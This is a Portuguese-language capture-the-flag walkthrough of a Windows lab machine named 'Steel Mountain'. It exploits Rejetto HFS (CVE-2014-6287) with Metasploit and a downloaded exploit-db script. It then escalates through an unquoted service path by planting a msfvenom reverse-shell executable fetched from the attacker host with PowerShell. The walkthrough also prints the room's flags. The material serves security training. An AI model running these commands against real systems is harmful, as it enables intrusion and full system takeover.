# Introdução

O objetivo dessa room é hackear uma máquina Windows com tema Mr. Robot. Uso do metasploit para acesso inicial, utilização de powershell para enumeração de escalonamento de privilégios do Windows e uso de uma nova técnica para obter acesso de administrador.

# Execução

## Task 1 - Introduction

A primeira tarefa consiste apenas em realizar o deploy da VM alvo e responder uma questão. 

Ao abrir o ip da VM no navegador, é exibida a página, conforme figura abaixo:

![Home page](images/employee_of_the_month.png)

Como dica para resposta da questão da task: ***Reverse image search***.

Primeira medida, consultar o código fonte da página para ver se tem alguma pista:

![Source code](images/employee_of_the_month02.png)

Nome do arquivo da foto do empregado: ***BillHarper.png***. Está ai a resposta!!!
### Questões:

- a. ***Who is the employee of the month?*** *Bill Harper*

## Task 2 - Initial Access  

Após o deploy da VM, primeiro etapa para continuar com a resolução da room, é um scan port.

### nmap

Criando uma variável de ambiente com o IP do alvo:

```shell
export TARGET=10.10.44.161
```

Execução do nmap:

```shell
nmap -A -T5 -Pn -p- $TARGET -oX portscan -vvv
```

Mais informações do comando acima no [link](https://explainshell.com/explain?cmd=nmap+-A+-T5+-Pn+-p-+%24TARGET+-oX+portscan+-vvv)

Outra porta está respondendo na web, a porta 8080. Ao abrir no browser http://TARGET:8080, observa-se que existe um serviço HPS rodando. Ao acessar http://www.rejetto.com/hfs/, site do fornecedor, pode ser respondida a questão ***b***.

### Pesquisa por CVE

De posse do nome do serviço e versão (HttpFileServer 2.3), pode-se acessar o https://www.exploit-db.com/ para verificar a existência de exploits e checar qual CVE para responder a questão ***c***.

A pesquisa é retornada diretamente no link: https://www.exploit-db.com/exploits/49125

Na própria descrição, existe a CVE indicada: CVE-2014-6287. Para responder a questão ***c***, colocar apenas a parte que tem os números, ou seja, 2014-6287.

### Acesso inicial

Inicia-se o msfconsole:

```shell
msfconsole
```

Pesquisa dentro da console do msfconsole:

![Search no msfconsole](images/msfconsole_search_httpfileserver.png)

Habilitar o exploit:

```shell
msf6 > use exploit/windows/http/rejetto_hfs_exec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Para confirmar o que necessida ser configurado, basta digitar ***options***.

Após realizar as configurações necessárias, basta executar o comando ***run***.

```shell
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.8.95.233:4443 
[*] Using URL: http://10.8.95.233:8888/qYhpuVYDp6r7
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /qYhpuVYDp6r7
[*] Meterpreter session 1 opened (10.8.95.233:4443 -> 10.10.44.161:49278) at 2022-07-17 20:06:02 -0400
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\UDHzvnZunWC.vbs' on the target

meterpreter > 
```

Para responder a questão, há uma dica ***C:\Users\bill\Desktop***. Após a shell reversa ser aberta, basta ir até o diretório indicado e visualizar o conteúdo do arquivo ***user.txt***.

```shell
meterpreter > dir
Listing: C:\Users\bill\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt

meterpreter > cat user.txt
b04763b6fcf51fcd7c13abc7db4fd365
meterpreter > 
```

### Questões:

- a. ***Scan the machine with nmap. What is the other port running a web server on?*** *8080*

- b. ***Take a look at the other web server. What file server is running?*** *Rejetto HTTP File Server*

- c. ***What is the CVE number to exploit this file server?*** *2014-6287*

- d. ***Use Metasploit to get an initial shell. What is the user flag?*** *b04763b6fcf51fcd7c13abc7db4fd365*

## Task 3 - Privilege Escalation  

Agora que já se tem um acesso inicial ao alvo, deve-se realizar uma enumeração em busca de fraquezas que possam ser exploradas para elevar privilégios.

Para enumerar esta máquina, pode-se usar o script powershell chamado ***[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)***, cujo objetivo é avaliar uma máquina Windows e determinar quaisquer anormalidades, que permitam escalonamento de privilégios do Windows que dependem de configurações incorretas.

Após realizar o download do script para a máquina atacante, dentro do msfconsole, é possível realizar o upload, com o comando:

```shell
upload PATH_ONDE_SALVOU_O_DOWNLOAD_DO_SCRIPT/PowerUp.ps1
```

Execução:

```shell
meterpreter > upload /home/kali/PowerUp.ps1
[*] uploading  : /home/kali/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 2.13 MiB of 2.13 MiB (100.0%): /home/kali/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /home/kali/PowerUp.ps1 -> PowerUp.ps1
```

Para executar o script, primeiro inicia-se o powershell dentro da console do meterpreter:

```shell
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > 
```

Execução do script:

```shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```
Na saída, haverá a resposta para questão ***b*** .

A opção CanRestart estando configurada como Trus, nos permite reiniciar um serviço no sistema, o diretório para o aplicativo também é gravável, permitindo que possamos substituir o aplicativo legítimo por um malicioso, reiniciar o serviço, que executará nosso programa infectado!

Com o msfvenom, vamos gerar um shell reverso como um executável do Windows:

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=IP_HOST_ATACANTE LPORT=4444 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

Usando um payload novo de shell reverso:

```shell
meterpreter > background
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST IP_HOST_ATACANTE
set LPORT 4444
run -j
```

Retornando para a sessão antiga:

```shell
shell
sc stop AdvancedSystemCareService9
```

Após parar a aplicação, pressione CTRL+C, responda y.

Realize o upload do exploit, arquivo executável malicioso:

```shell
upload ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

Retorne novamente ao shell e inicie a aplicação, que executará agora o arquivo malicioso:

```shell
shell
sc start AdvancedSystemCareService9
```

Um shell com permissão elevada será obtido. Agora basta ler o conteúdo do arquivo ***C:/Users/Administrator/Desktop/root.txt***. Resposta da questão ***d***.
### Questões:

- a. ***Informações sobre como enumerar o alvo*** *Não há necessidade de resposta*

- b. ***Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?*** *AdvancedSystemCareService9*

- c. ***Informações adicionais*** *Não há necessidade de resposta*

## Task 4 - Access and Escalation Without Metaspl
oit 

- d. ***What is the root flag?*** 9af5f314f57607c00fd09803a587db80

## Task 4 - Access and Escalation Without Metasploit 

Na última task é proposto a elevação de privilégio sem usar o Metasploit. Para concluir a task é sugerido o uso do script power shell winPEAS para enumerar o alvo, coletando informações relevantes para escalada de privilégios.

Para iniciar a exploração, será usado um exploit que está no [link](https://www.exploit-db.com/exploits/39161). Observe que é necessário ter um servidor web e um listener netcat ativos ao mesmo tempo para que isso funcione!

Será necessário também realizar o download do binário do netcat para windows, [aqui](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe).

```shell
┌──(root㉿kali)-[/mnt/tryhackme/rooms/steelmountain]
└─# wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
--2022-07-19 12:02:43--  https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
Resolving eternallybored.org (eternallybored.org)... 84.255.206.8, 2a01:260:4094:1:42:42:42:42
Connecting to eternallybored.org (eternallybored.org)|84.255.206.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 109604 (107K) [application/zip]
Saving to: ‘netcat-win32-1.11.zip’

netcat-win32-1.11.zip        100%[=============================================>] 107.04K   184KB/s    in 0.6s    

2022-07-19 12:02:46 (184 KB/s) - ‘netcat-win32-1.11.zip’ saved [109604/109604]

                                                                                                                   
┌──(root㉿kali)-[/mnt/tryhackme/rooms/steelmountain]
└─# wget https://www.exploit-db.com/download/39161                   
--2022-07-19 12:03:06--  https://www.exploit-db.com/download/39161
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2515 (2.5K) [application/txt]
Saving to: ‘39161’

39161                        100%[=============================================>]   2.46K  --.-KB/s    in 0s      

2022-07-19 12:03:06 (7.51 MB/s) - ‘39161’ saved [2515/2515]

                                                                                                                   
┌──(root㉿kali)-[/mnt/tryhackme/rooms/steelmountain]
└─# ls
39161  images  netcat-win32-1.11.zip  portscan  steelmountain.md
```

Descompacte o netcat:

```shell
┌──(root㉿kali)-[/mnt/tryhackme/rooms/steelmountain]
└─# unzip netcat-win32-1.11.zip 
Archive:  netcat-win32-1.11.zip
  inflating: netcat-1.11/doexec.c    
  inflating: netcat-1.11/generic.h   
  inflating: netcat-1.11/getopt.c    
  inflating: netcat-1.11/getopt.h    
  inflating: netcat-1.11/hobbit.txt  
  inflating: netcat-1.11/license.txt  
  inflating: netcat-1.11/Makefile    
  inflating: netcat-1.11/nc.exe      
  inflating: netcat-1.11/nc64.exe    
  inflating: netcat-1.11/netcat.c    
  inflating: netcat-1.11/readme.txt  
                                                                                                                   
┌──(root㉿kali)-[/mnt/tryhackme/rooms/steelmountain]
└─# ll
total 156
-rwxrwx--- 1 root vboxsf   2515 Jul 19 12:03 39161
drwxrwx--- 1 root vboxsf   4096 Jul 18 13:06 images
drwxrwx--- 1 root vboxsf   4096 Jul 19 12:04 netcat-1.11
-rwxrwx--- 1 root vboxsf 109604 Dec 26  2010 netcat-win32-1.11.zip
-rwxrwx--- 1 root vboxsf  21204 Jul 18 13:06 portscan
-rwxrwx--- 1 root vboxsf  10020 Jul 19 12:03 steelmountain.md
```

Iniciando um listener netcat no host atacante:

```shell
┌──(kali㉿kali)-[~]
└─$ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Iniciando um webserver no diretório onde foi baixado o exploit e o nc para windows:

```shell
┌──(root㉿kali)-[/mnt/tryhackme/rooms/steelmountain]
└─# sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Renomeia-se o arquivo .py do exploit para exploit.py. Depois, edita-se o arquivo mude o IP para o IP do host atacante (linha que tem: ***ip_addr = "192.168.44.128" #local IP address***).

```shell
┌──(root㉿kali)-[/mnt/tryhackme/rooms/steelmountain]
└─# mv 39161 exploit.py  
```

Executa-se o exploit:

```shell
python exploit.py 10.10.247.243 8080
```

Resultado:

```shell
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd c:\users\bill\desktop
cd c:\users\bill\desktop

c:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users\bill\Desktop

09/27/2019  09:08 AM    <DIR>          .
09/27/2019  09:08 AM    <DIR>          ..
09/27/2019  05:42 AM                70 user.txt
               1 File(s)             70 bytes
               2 Dir(s)  44,131,753,984 bytes free

c:\Users\bill\Desktop>more user.txt
more user.txt
b04763b6fcf51fcd7c13abc7db4fd365

c:\Users\bill\Desktop>
```

Após o acesso inicial, será utilizado o winPEAS usando powershell -c. Uma vez que executamos o winPeas, observa-se que ele nos aponta para caminhos não citados. Podemos ver que ele nos fornece o nome do serviço que também está executando. 

Agora, realiza-se o download do winPEAS, deixando-o diponível através de um webserver no host atacante:

```shell
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat

mv winPEAS.bat /tmp
cd /tmp
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

No shell do host alvo:

```shell
c:\Users\bill\Desktop>powershell -c "Invoke-WebRequest -Uri 'http://IP_HOST_ATACANTE:8000/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winpeas.bat'"
powershell -c "Invoke-WebRequest -Uri 'http://IP_HOST_ATACANTE:8000/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winpeas.bat'"

c:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users\bill\Desktop

06/05/2020  11:27 PM    <DIR>          .
06/05/2020  11:27 PM    <DIR>          ..
09/27/2019  05:42 AM                70 user.txt
06/05/2020  11:27 PM            32,976 winpeas.bat
               2 File(s)         33,046 bytes
               2 Dir(s)  44,259,053,568 bytes free

c:\Users\bill\Desktop>winpeas.bat
```

Na última linha é exeuctado o winpeas.bat.

Atentar para substituir o IP_HOST_ATACANTE, pelo IP do host atacante.

Após a finalização da execução, várias informações de interesse são mostradas.

Liste os serviços com:

```shell
powershell -c Get-Service
```
Essa é a resposta da questão ***b*** é ***powershell -c Get-Service***.

Para a escalar privilégios, será parecido com o que foi feito na task 3.

Gerando o payload com msfvenom:

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=IP_HOST_ATACANTE LPORT=9999 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

No host atacante, inicia-se um listener com netcat:

```shell
rlwrap nc -nlvp 9999
```

Pare o serviço que será explorado:

```shell
sc stop AdvancedSystemCareService9
```

No shell do host alvo:

```shell
C:\Program Files (x86)\IObit>powershell -c "Invoke-WebRequest -Uri 'http://IP_HOST_ATACANTE/ASCService.exe' -OutFile 'c:\program files (x86)\IObit\ASCService.exe'"
```

Inicie o serviço parado anteriormente:

```shell
sc start AdvancedSystemCareService9
```

No listener nc aberto no host atacante, será recebida uma conexão com shell reversa:

```shell
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>more c:\users\administrator\desktop\root.txt
more c:\users\administrator\desktop\root.txt
9af5f314f57607c00fd09803a587db80
```

### Questões:

- a. ***Informações adicionais***  *Não há necessidade de resposta*

- b. ***What powershell -c command could we run to manually find out the service name?*** *powershell -c "Get-Service"*

- c. ***Informações adicionais*** *Não há necessidade de resposta*

